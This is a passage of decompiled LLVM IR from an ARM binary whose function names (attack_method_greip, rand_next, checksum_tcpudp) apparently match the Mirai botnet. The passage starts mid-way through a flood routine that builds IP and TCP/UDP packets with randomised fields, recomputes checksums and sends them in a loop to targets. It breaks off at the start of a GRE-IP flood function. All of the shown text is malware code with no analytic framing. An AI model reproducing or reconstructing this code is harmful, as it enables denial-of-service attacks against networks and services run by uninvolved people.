  %v2_976c = add i32 %v1_976c, 12
  %v3_976c = inttoptr i32 %v2_976c to i32*
  store i32 %v0_974c, i32* %v3_976c, align 4
  %v3_9770 = load i32, i32* %stack_var_-44, align 4
  %v0_9774 = load i32, i32* %r4.global-to-local, align 4
  %v1_9774 = add i32 %v0_9774, 58
  store i32 %v1_9774, i32* @r6, align 4
  store i32 %v4_9778, i32* %r2.global-to-local, align 4
  %v1_977c = add i32 %v3_9770, 1
  store i32 %v1_977c, i32* @r4, align 4
  store i32 %v4_9780, i32* %r3.global-to-local, align 4
  %v1_9784 = load i32, i32* @sl, align 4
  %v9_9784 = icmp eq i32 %v1_977c, %v1_9784
  store i1 %v9_9784, i1* %cpsr_z.global-to-local, align 1
  %v0_9788 = load i32, i32* @r7, align 4
  %v1_9788 = trunc i32 %v0_9788 to i16
  %v3_9788 = add i32 %v0_9774, 62
  %v4_9788 = inttoptr i32 %v3_9788 to i16*
  store i16 %v1_9788, i16* %v4_9788, align 2
  %v0_978c = load i32, i32* %r2.global-to-local, align 4
  %v1_978c = trunc i32 %v0_978c to i16
  %v2_978c = load i32, i32* @r6, align 4
  %v3_978c = inttoptr i32 %v2_978c to i16*
  store i16 %v1_978c, i16* %v3_978c, align 2
  %v0_9790 = load i32, i32* %r3.global-to-local, align 4
  %v1_9790 = trunc i32 %v0_9790 to i16
  %v2_9790 = load i32, i32* @r6, align 4
  %v3_9790 = add i32 %v2_9790, 2
  %v4_9790 = inttoptr i32 %v3_9790 to i16*
  store i16 %v1_9790, i16* %v4_9790, align 2
  %v0_9794 = load i32, i32* @r4, align 4
  store i32 %v0_9794, i32* %stack_var_-44, align 4
  %v5_9798 = icmp slt i32 %v1_977c, %v1_9784
  br i1 %v5_9798, label %dec_label_pc_9640, label %dec_label_pc_979c

dec_label_pc_979c:                                ; preds = %bb85
  %v1_97a4 = add i32 %v5_94c0, 8
  store i32 %v1_97a4, i32* %r4.global-to-local, align 4
  %v1_97a8 = add i32 %v5_94c0, 66
  store i32 %v1_97a8, i32* %r5.global-to-local, align 4
  %v0_97b8.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_97b4.preheader

dec_label_pc_97b4.preheader:                      ; preds = %dec_label_pc_979c, %dec_label_pc_9a4c
  %v0_97b8.pre = phi i32 [ %v0_97b8.pre.pre, %dec_label_pc_979c ], [ 0, %dec_label_pc_9a4c ]
  %stack_var_-132.0.ph = phi i32 [ %v1_97a8, %dec_label_pc_979c ], [ %v1_9a58, %dec_label_pc_9a4c ]
  %stack_var_-136.0.ph = phi i32 [ %v1_97a4, %dec_label_pc_979c ], [ %v1_9a54, %dec_label_pc_9a4c ]
  %v2_9a08 = icmp eq i32 %v1_956c, 0
  %v2_9850 = ptrtoint i32* %stack_var_-48 to i32
  %v2_9868 = ptrtoint i32* %stack_var_-52 to i32
  %v2_9878 = ptrtoint i32* %stack_var_-56 to i32
  %v2_9884 = ptrtoint i32* %stack_var_-54 to i32
  %v2_9898 = icmp eq i32 %v1_94e0, 0
  %v2_97f8 = icmp eq i32 %v5_9514, -1
  %v7_97f8 = icmp eq i32 %v5_9514, -1
  br label %dec_label_pc_97b4

dec_label_pc_97b4:                                ; preds = %dec_label_pc_97b4, %dec_label_pc_98a0, %dec_label_pc_97b4.preheader
  %v0_97b8 = phi i32 [ %v0_97b8.pre, %dec_label_pc_97b4.preheader ], [ 0, %dec_label_pc_97b4 ], [ %v1_993c, %dec_label_pc_98a0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_97b8 = icmp eq i32 %v0_97b8, 0
  store i1 %v2_97b8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_97b8, label %dec_label_pc_97b4, label %dec_label_pc_97c4

dec_label_pc_97c4:                                ; preds = %dec_label_pc_97b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_97c8

dec_label_pc_97c8:                                ; preds = %dec_label_pc_98a0, %dec_label_pc_97c4
  %v1_97dc = phi i32 [ %v1_9938, %dec_label_pc_98a0 ], [ 0, %dec_label_pc_97c4 ]
  %v5_97cc = mul i32 %v1_97dc, 24
  %v1_97d0 = load i32, i32* @sb, align 4
  %v2_97d0 = add i32 %v1_97d0, %v5_97cc
  store i32 %v2_97d0, i32* %r3.global-to-local, align 4
  store i32 %v2_93f4, i32* %r4.global-to-local, align 4
  %v1_97d8 = add i32 %v2_97d0, 20
  %v2_97d8 = inttoptr i32 %v1_97d8 to i8*
  %v3_97d8 = load i8, i8* %v2_97d8, align 1
  %v4_97d8 = zext i8 %v3_97d8 to i32
  store i32 %v4_97d8, i32* %r2.global-to-local, align 4
  %v4_97dc = mul i32 %v1_97dc, 4
  %v5_97dc = add i32 %v4_97dc, %v2_93f4
  %v6_97dc = inttoptr i32 %v5_97dc to i32*
  %v7_97dc = load i32, i32* %v6_97dc, align 4
  store i32 %v7_97dc, i32* @r5, align 4
  %v7_97e0 = icmp eq i8 %v3_97d8, 31
  store i1 %v7_97e0, i1* %cpsr_z.global-to-local, align 1
  %v1_97e4 = add i32 %v7_97dc, 24
  store i32 %v1_97e4, i32* @r7, align 4
  %v1_97e8 = add i32 %v7_97dc, 38
  store i32 %v1_97e8, i32* @r6, align 4
  %v1_97ec = add i32 %v7_97dc, 58
  store i32 %v1_97ec, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_97d8, 32
  br i1 %tmp90, label %dec_label_pc_994c, label %dec_label_pc_97f4

dec_label_pc_97f4:                                ; preds = %dec_label_pc_97c8
  store i32 %v5_9514, i32* %r1.global-to-local, align 4
  store i1 %v7_97f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97f8, label %dec_label_pc_99ac, label %dec_label_pc_9800

dec_label_pc_9800:                                ; preds = %dec_label_pc_994c, %dec_label_pc_97f4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9808 = load i32, i32* @fp, align 4
  %v9_9808 = icmp eq i32 %v0_9808, 65535
  store i1 %v9_9808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9808, label %dec_label_pc_99c4, label %dec_label_pc_9810

dec_label_pc_9810:                                ; preds = %dec_label_pc_99ac.dec_label_pc_9810_crit_edge, %dec_label_pc_9800
  %v1_9814 = phi i32 [ %v1_9814.pre, %dec_label_pc_99ac.dec_label_pc_9810_crit_edge ], [ 65535, %dec_label_pc_9800 ]
  store i32 %v3_9574, i32* %r2.global-to-local, align 4
  %v9_9814 = icmp eq i32 %v3_9574, %v1_9814
  store i1 %v9_9814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9814, label %dec_label_pc_99ec, label %dec_label_pc_981c

dec_label_pc_981c:                                ; preds = %dec_label_pc_99c4.dec_label_pc_981c_crit_edge, %dec_label_pc_9810
  %v1_9820 = phi i32 [ %v1_9820.pre, %dec_label_pc_99c4.dec_label_pc_981c_crit_edge ], [ %v1_9814, %dec_label_pc_9810 ]
  store i32 %v3_9578, i32* %r3.global-to-local, align 4
  %v9_9820 = icmp eq i32 %v3_9578, %v1_9820
  store i1 %v9_9820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9820, label %dec_label_pc_9a00, label %dec_label_pc_9828

dec_label_pc_9828:                                ; preds = %dec_label_pc_99ec, %dec_label_pc_981c
  store i32 %v1_956c, i32* @r4, align 4
  store i1 %v2_9a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a08, label %dec_label_pc_9a1c, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_9828
  %v1_9830 = load i32, i32* @r5, align 4
  %v2_9830 = add i32 %v1_9830, 16
  %v3_9830 = inttoptr i32 %v2_9830 to i32*
  %v4_9830 = load i32, i32* %v3_9830, align 4
  store i32 %v4_9830, i32* %r3.global-to-local, align 4
  %v2_9834 = load i32, i32* @r6, align 4
  %v3_9834 = add i32 %v2_9834, 16
  %v4_9834 = inttoptr i32 %v3_9834 to i32*
  store i32 %v4_9830, i32* %v4_9834, align 4
  br label %dec_label_pc_983c

dec_label_pc_983c:                                ; preds = %bb88, %.thread11, %dec_label_pc_9a1c
  %v0_983c = call i32 @rand_next()
  store i32 %v0_983c, i32* %r0.global-to-local, align 4
  store i32 %v0_983c, i32* %stack_var_-48, align 4
  %v0_9844 = call i32 @rand_next()
  store i32 %v0_9844, i32* %r0.global-to-local, align 4
  store i32 %v0_9844, i32* %stack_var_-52, align 4
  %v0_984c = call i32 @rand_next()
  store i32 %v2_9850, i32* %r1.global-to-local, align 4
  store i32 %v0_984c, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_985c = load i32, i32* @r7, align 4
  store i32 %v0_985c, i32* %r0.global-to-local, align 4
  %v3_9860 = call i32 @util_memcpy(i32 %v0_985c, i32 %v2_9850, i32 4)
  %v0_9864 = load i32, i32* @r7, align 4
  %v1_9864 = add i32 %v0_9864, 6
  store i32 %v1_9864, i32* %r0.global-to-local, align 4
  store i32 %v2_9868, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_9870 = call i32 @util_memcpy(i32 %v1_9864, i32 %v2_9868, i32 4)
  %v0_9874 = load i32, i32* @r7, align 4
  %v1_9874 = add i32 %v0_9874, 4
  store i32 %v1_9874, i32* %r0.global-to-local, align 4
  store i32 %v2_9878, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9880 = call i32 @util_memcpy(i32 %v1_9874, i32 %v2_9878, i32 2)
  store i32 %v2_9884, i32* %r1.global-to-local, align 4
  %v0_9888 = load i32, i32* @r7, align 4
  %v1_9888 = add i32 %v0_9888, 10
  store i32 %v1_9888, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9890 = call i32 @util_memcpy(i32 %v1_9888, i32 %v2_9884, i32 2)
  store i32 %v3_9890, i32* %r0.global-to-local, align 4
  store i32 %v1_94e0, i32* %r1.global-to-local, align 4
  store i1 %v2_9898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9898, label %dec_label_pc_98a0, label %dec_label_pc_9a28

dec_label_pc_98a0:                                ; preds = %dec_label_pc_983c, %dec_label_pc_9a28
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_98a4 = load i32, i32* @r5, align 4
  %v3_98a4 = add i32 %v2_98a4, 10
  %v4_98a4 = inttoptr i32 %v3_98a4 to i16*
  store i16 0, i16* %v4_98a4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_98ac = load i32, i32* @r5, align 4
  store i32 %v0_98ac, i32* @r0, align 4
  %v2_98b0 = call i32 @checksum_generic(i32 %v0_98ac, i32 20)
  %v3_98b0 = trunc i32 %v2_98b0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_98b8 = load i32, i32* @r5, align 4
  %v4_98b8 = add i32 %v3_98b8, 10
  %v5_98b8 = inttoptr i32 %v4_98b8 to i16*
  store i16 %v3_98b0, i16* %v5_98b8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_98c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_98c0 = trunc i32 %v0_98c0 to i16
  %v2_98c0 = load i32, i32* @r6, align 4
  %v3_98c0 = add i32 %v2_98c0, 10
  %v4_98c0 = inttoptr i32 %v3_98c0 to i16*
  store i16 %v1_98c0, i16* %v4_98c0, align 2
  %v0_98c4 = load i32, i32* @r6, align 4
  store i32 %v0_98c4, i32* @r0, align 4
  %v2_98c8 = call i32 @checksum_generic(i32 %v0_98c4, i32 20)
  %v3_98c8 = trunc i32 %v2_98c8 to i16
  store i32 %v2_98c8, i32* %r0.global-to-local, align 4
  %v3_98cc = load i32, i32* @r6, align 4
  %v4_98cc = add i32 %v3_98cc, 10
  %v5_98cc = inttoptr i32 %v4_98cc to i16*
  store i16 %v3_98c8, i16* %v5_98cc, align 2
  store i32 0, i32* @r4, align 4
  %v0_98d4 = load i32, i32* @r8, align 4
  store i32 %v0_98d4, i32* @r1, align 4
  %v1_98d8 = add i32 %v0_98d4, 4
  %v2_98d8 = inttoptr i32 %v1_98d8 to i16*
  %v3_98d8 = load i16, i16* %v2_98d8, align 2
  %v4_98d8 = zext i16 %v3_98d8 to i32
  store i32 %v4_98d8, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_98e0 = add i32 %v0_98d4, 6
  %v4_98e0 = inttoptr i32 %v3_98e0 to i16*
  store i16 0, i16* %v4_98e0, align 2
  %v0_98e4 = load i32, i32* @r6, align 4
  store i32 %v0_98e4, i32* %r0.global-to-local, align 4
  %v4_98e8 = call i32 @checksum_tcpudp(i32 %v0_98e4, i32 %v0_98d4, i32 %v4_98d8, i32 %stack_var_-136.0.ph)
  %v5_98e8 = trunc i32 %v4_98e8 to i16
  store i32 %v4_98e8, i32* %r0.global-to-local, align 4
  %v3_98ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98ec, i32* %r2.global-to-local, align 4
  %v3_98f0 = mul i32 %v3_98ec, 32
  store i32 %v3_98f0, i32* %r3.global-to-local, align 4
  %v0_98f4 = load i32, i32* @r5, align 4
  %v1_98f4 = add i32 %v0_98f4, 16
  %v2_98f4 = inttoptr i32 %v1_98f4 to i32*
  %v3_98f4 = load i32, i32* %v2_98f4, align 4
  %v5_98f8 = mul i32 %v3_98ec, 24
  store i32 %v5_98f8, i32* %r3.global-to-local, align 4
  %v1_98fc = load i32, i32* @sb, align 4
  %v2_98fc = add i32 %v1_98fc, %v5_98f8
  store i32 %v2_98fc, i32* @lr, align 4
  %v2_9900 = add i32 %v2_98fc, 4
  %v3_9900 = inttoptr i32 %v2_9900 to i32*
  store i32 %v3_98f4, i32* %v3_9900, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9908 = load i32, i32* @r8, align 4
  %v4_9908 = add i32 %v3_9908, 6
  %v5_9908 = inttoptr i32 %v4_9908 to i16*
  store i16 %v5_98e8, i16* %v5_9908, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9910 = load i32, i32* %r1.global-to-local, align 4
  %v1_9910 = trunc i32 %v0_9910 to i16
  %v2_9910 = load i32, i32* %r3.global-to-local, align 4
  %v3_9910 = load i32, i32* @sb, align 4
  %v4_9910 = add i32 %v3_9910, %v2_9910
  %v5_9910 = inttoptr i32 %v4_9910 to i16*
  store i16 %v1_9910, i16* %v5_9910, align 2
  %v0_9914 = load i32, i32* @r4, align 4
  %v1_9914 = trunc i32 %v0_9914 to i16
  %v2_9914 = load i32, i32* @lr, align 4
  %v3_9914 = add i32 %v2_9914, 2
  %v4_9914 = inttoptr i32 %v3_9914 to i16*
  store i16 %v1_9914, i16* %v4_9914, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_991c = load i32, i32* @r5, align 4
  store i32 %v0_991c, i32* %r1.global-to-local, align 4
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_9928 = load i32, i32* @lr, align 4
  %v0_992c = load i32, i32* %ip.global-to-local, align 4
  %v6_9930 = call i32 @__libc_sendto(i32 %v3_9528, i32 %v0_991c, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_9928, i32 %v0_992c)
  %v3_9934 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9934, i32* %r3.global-to-local, align 4
  %v1_9938 = add i32 %v3_9934, 1
  store i32 %v1_9938, i32* %r0.global-to-local, align 4
  %v1_993c = load i32, i32* @sl, align 4
  %v9_993c = icmp eq i32 %v1_9938, %v1_993c
  store i1 %v9_993c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9938, i32* %stack_var_-44, align 4
  %v6_9944 = icmp slt i32 %v1_9938, %v1_993c
  br i1 %v6_9944, label %dec_label_pc_97c8, label %dec_label_pc_97b4

dec_label_pc_994c:                                ; preds = %dec_label_pc_97c8
  %v1_994c = add i32 %v2_97d0, 16
  %v2_994c = inttoptr i32 %v1_994c to i32*
  %v3_994c = load i32, i32* %v2_994c, align 4
  store i32 %v3_994c, i32* %r4.global-to-local, align 4
  %v0_9950 = call i32 @rand_next()
  store i32 %v0_9950, i32* %r0.global-to-local, align 4
  %v3_9954 = load i32, i32* %stack_var_-44, align 4
  %v5_995c = mul i32 %v3_9954, 24
  %v0_9960 = load i32, i32* %r4.global-to-local, align 4
  %v1_9960 = and i32 %v0_9960, 16711680
  store i32 %v1_9960, i32* %ip.global-to-local, align 4
  %v3_9964 = udiv i32 %v0_9960, 16777216
  %v4_9968 = udiv i32 %v1_9960, 256
  %v5_9968 = or i32 %v4_9968, %v3_9964
  store i32 %v5_9968, i32* %r2.global-to-local, align 4
  %v1_996c = load i32, i32* @sb, align 4
  %v2_996c = add i32 %v1_996c, %v5_995c
  store i32 %v2_996c, i32* %r1.global-to-local, align 4
  %v1_9970 = and i32 %v0_9960, 65280
  store i32 %v1_9970, i32* %r3.global-to-local, align 4
  %v1_9974 = add i32 %v2_996c, 20
  %v2_9974 = inttoptr i32 %v1_9974 to i8*
  %v3_9974 = load i8, i8* %v2_9974, align 1
  %v4_9974 = zext i8 %v3_9974 to i32
  store i32 %v4_9974, i32* %ip.global-to-local, align 4
  %v5_997c = call i32 @llvm.bswap.i32(i32 %v0_9960)
  %v7_9980 = lshr i32 %v0_9950, %v4_9974
  %v8_9980 = add i32 %v7_9980, %v5_997c
  store i32 %v8_9980, i32* %r2.global-to-local, align 4
  %v1_9984 = and i32 %v8_9980, 16711680
  store i32 %v1_9984, i32* %r0.global-to-local, align 4
  store i32 %v5_9514, i32* %r1.global-to-local, align 4
  %v5_999c = call i32 @llvm.bswap.i32(i32 %v8_9980)
  store i32 %v5_999c, i32* %r3.global-to-local, align 4
  store i1 %v7_97f8, i1* %cpsr_z.global-to-local, align 1
  %v1_99a4 = load i32, i32* @r5, align 4
  %v2_99a4 = add i32 %v1_99a4, 16
  %v3_99a4 = inttoptr i32 %v2_99a4 to i32*
  store i32 %v5_999c, i32* %v3_99a4, align 4
  br i1 %v2_97f8, label %dec_label_pc_99ac, label %dec_label_pc_9800

dec_label_pc_99ac:                                ; preds = %dec_label_pc_994c, %dec_label_pc_97f4
  %v0_99ac = call i32 @rand_next()
  store i32 %v0_99ac, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_99b8 = load i32, i32* @fp, align 4
  %v9_99b8 = icmp eq i32 %v0_99b8, 65535
  store i1 %v9_99b8, i1* %cpsr_z.global-to-local, align 1
  %v1_99bc = load i32, i32* @r5, align 4
  %v2_99bc = add i32 %v1_99bc, 12
  %v3_99bc = inttoptr i32 %v2_99bc to i32*
  store i32 %v0_99ac, i32* %v3_99bc, align 4
  br i1 %v9_99b8, label %dec_label_pc_99c4, label %dec_label_pc_99ac.dec_label_pc_9810_crit_edge

dec_label_pc_99ac.dec_label_pc_9810_crit_edge:    ; preds = %dec_label_pc_99ac
  %v1_9814.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9810

dec_label_pc_99c4:                                ; preds = %dec_label_pc_99ac, %dec_label_pc_9800
  %v0_99c4 = call i32 @rand_next()
  %v3_99cc = urem i32 %v0_99c4, 65536
  store i32 %v3_99cc, i32* %r0.global-to-local, align 4
  store i32 %v3_9574, i32* %r2.global-to-local, align 4
  %v1_99d8 = sub nsw i32 999, %v3_99cc
  store i32 %v1_99d8, i32* %r3.global-to-local, align 4
  %v1_99dc = load i32, i32* %r4.global-to-local, align 4
  %v9_99dc = icmp eq i32 %v3_9574, %v1_99dc
  store i1 %v9_99dc, i1* %cpsr_z.global-to-local, align 1
  %v1_99e0 = trunc i32 %v0_99c4 to i16
  %v2_99e0 = load i32, i32* @r5, align 4
  %v3_99e0 = add i32 %v2_99e0, 4
  %v4_99e0 = inttoptr i32 %v3_99e0 to i16*
  store i16 %v1_99e0, i16* %v4_99e0, align 2
  %v0_99e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_99e4 = trunc i32 %v0_99e4 to i16
  %v2_99e4 = load i32, i32* @r6, align 4
  %v3_99e4 = add i32 %v2_99e4, 4
  %v4_99e4 = inttoptr i32 %v3_99e4 to i16*
  store i16 %v1_99e4, i16* %v4_99e4, align 2
  br i1 %v9_99dc, label %dec_label_pc_99ec, label %dec_label_pc_99c4.dec_label_pc_981c_crit_edge

dec_label_pc_99c4.dec_label_pc_981c_crit_edge:    ; preds = %dec_label_pc_99c4
  %v1_9820.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_981c

dec_label_pc_99ec:                                ; preds = %dec_label_pc_99c4, %dec_label_pc_9810
  %v0_99ec = call i32 @rand_next()
  %v1_99ec = trunc i32 %v0_99ec to i16
  store i32 %v0_99ec, i32* %r0.global-to-local, align 4
  store i32 %v3_9578, i32* %r3.global-to-local, align 4
  %v1_99f4 = load i32, i32* %r4.global-to-local, align 4
  %v9_99f4 = icmp eq i32 %v3_9578, %v1_99f4
  store i1 %v9_99f4, i1* %cpsr_z.global-to-local, align 1
  %v3_99f8 = load i32, i32* @r5, align 4
  %v4_99f8 = add i32 %v3_99f8, 58
  %v5_99f8 = inttoptr i32 %v4_99f8 to i16*
  store i16 %v1_99ec, i16* %v5_99f8, align 2
  br i1 %v9_99f4, label %dec_label_pc_9a00, label %dec_label_pc_9828

dec_label_pc_9a00:                                ; preds = %dec_label_pc_99ec, %dec_label_pc_981c
  %v0_9a00 = call i32 @rand_next()
  %v1_9a00 = trunc i32 %v0_9a00 to i16
  store i32 %v0_9a00, i32* %r0.global-to-local, align 4
  store i32 %v1_956c, i32* @r4, align 4
  store i1 %v2_9a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a08, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_9a00
  %v3_9a1032 = load i32, i32* @r8, align 4
  %v4_9a1033 = add i32 %v3_9a1032, 2
  %v5_9a1034 = inttoptr i32 %v4_9a1033 to i16*
  store i16 %v1_9a00, i16* %v5_9a1034, align 2
  br label %dec_label_pc_9a1c

bb88:                                             ; preds = %dec_label_pc_9a00
  %v1_9a0c = load i32, i32* @r5, align 4
  %v2_9a0c = add i32 %v1_9a0c, 16
  %v3_9a0c = inttoptr i32 %v2_9a0c to i32*
  %v4_9a0c = load i32, i32* %v3_9a0c, align 4
  store i32 %v4_9a0c, i32* %r3.global-to-local, align 4
  %v3_9a10 = load i32, i32* @r8, align 4
  %v4_9a10 = add i32 %v3_9a10, 2
  %v5_9a10 = inttoptr i32 %v4_9a10 to i16*
  store i16 %v1_9a00, i16* %v5_9a10, align 2
  %v1_9a14 = load i32, i32* %r3.global-to-local, align 4
  %v2_9a14 = load i32, i32* @r6, align 4
  %v3_9a14 = add i32 %v2_9a14, 16
  %v4_9a14 = inttoptr i32 %v3_9a14 to i32*
  store i32 %v1_9a14, i32* %v4_9a14, align 4
  br label %dec_label_pc_983c

dec_label_pc_9a1c:                                ; preds = %.thread31, %dec_label_pc_9828
  %v0_9a1c = call i32 @rand_next()
  store i32 %v0_9a1c, i32* %r0.global-to-local, align 4
  %v1_9a20 = load i32, i32* @r6, align 4
  %v2_9a20 = add i32 %v1_9a20, 16
  %v3_9a20 = inttoptr i32 %v2_9a20 to i32*
  store i32 %v0_9a1c, i32* %v3_9a20, align 4
  br label %dec_label_pc_983c

dec_label_pc_9a28:                                ; preds = %dec_label_pc_983c
  %v0_9a28 = load i32, i32* @r8, align 4
  %v1_9a28 = add i32 %v0_9a28, 8
  store i32 %v1_9a28, i32* %r0.global-to-local, align 4
  store i32 %v5_94c0, i32* %r1.global-to-local, align 4
  %v2_9a30 = inttoptr i32 %v1_9a28 to i16*
  %v3_9a30 = call i32 @rand_str(i16* %v2_9a30, i32 %v5_94c0)
  store i32 %v3_9a30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98a0

dec_label_pc_9a38:                                ; preds = %dec_label_pc_9538
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  %v1_9a3c = call i32 @__GI___libc_close(i32 %v3_9528)
  store i32 %v1_9a3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a40

dec_label_pc_9a40:                                ; preds = %entry, %dec_label_pc_9a38
  %v1_9a48 = phi i32 [ %v3_9528, %entry ], [ %v1_9a3c, %dec_label_pc_9a38 ]
  store i32 %v3_93d8, i32* %r4.global-to-local, align 4
  store i32 %v6_93d8, i32* %r5.global-to-local, align 4
  store i32 %v24_93d8, i32* %fp.global-to-local, align 4
  ret i32 %v1_9a48

dec_label_pc_9a4c:                                ; preds = %dec_label_pc_9560
  %v1_9a54 = add i32 %v5_94c0, 8
  store i32 %v1_9a54, i32* %r1.global-to-local, align 4
  %v1_9a58 = add i32 %v5_94c0, 66
  store i32 %v1_9a58, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_97b4.preheader

; uselistorder directives
  uselistorder i32 %v1_9a58, { 1, 0 }
  uselistorder i32 %v1_9a54, { 1, 0 }
  uselistorder i16 %v1_9a00, { 1, 0 }
  uselistorder i32 %v0_9a00, { 1, 0 }
  uselistorder i32 %v0_99ec, { 1, 0 }
  uselistorder i32 %v3_99cc, { 1, 0 }
  uselistorder i32 %v0_99c4, { 1, 0 }
  uselistorder i32 %v5_999c, { 1, 0 }
  uselistorder i32 %v0_9960, { 1, 2, 0, 3 }
  uselistorder i32 %v1_993c, { 1, 2, 0 }
  uselistorder i32 %v1_9938, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_98ec, { 1, 0, 2 }
  uselistorder i32 %v4_98e8, { 1, 0 }
  uselistorder i32 %v0_98d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_98c8, { 1, 0 }
  uselistorder i32 %v7_97dc, { 2, 1, 0, 3 }
  uselistorder i1 %v7_97f8, { 2, 1, 0 }
  uselistorder i1 %v2_9a08, { 2, 3, 1, 0 }
  uselistorder i32 %v0_974c, { 1, 0, 2 }
  uselistorder i32 %v3_95c8, { 1, 0 }
  uselistorder i32 %v3_95ac, { 1, 2, 0 }
  uselistorder i32 %v1_95a8, { 1, 0 }
  uselistorder i32 %v1_956c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9568, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9564, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9560, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9558, { 1, 0 }
  uselistorder i1 %v7_952c, { 1, 0 }
  uselistorder i32 %v3_9528, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_9514, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_94e0, { 1, 2, 0 }
  uselistorder i32 %v5_94c0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_9474, { 1, 0 }
  uselistorder i32 %v1_9450, { 2, 1, 0 }
  uselistorder i32 %v5_9448, { 1, 0 }
  uselistorder i8 %v5_942c, { 0, 2, 1 }
  uselistorder i32 %v6_940c, { 1, 0 }
  uselistorder i32 %v2_93f4, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 7, 6, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 1, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 10, 12, 11, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 11, 37, 12, 13, 15, 14, 16, 17, 19, 18, 21, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 17, 27, 28, 29, 30, 31, 33, 32, 36, 34, 35, 39, 37, 38, 40, 42, 41, 43, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 8, 9, 10, 11, 12, 13, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9a40, { 1, 0 }
  uselistorder label %dec_label_pc_98a0, { 1, 0 }
  uselistorder label %dec_label_pc_983c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_97b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_97b4.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @attack_method_greip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
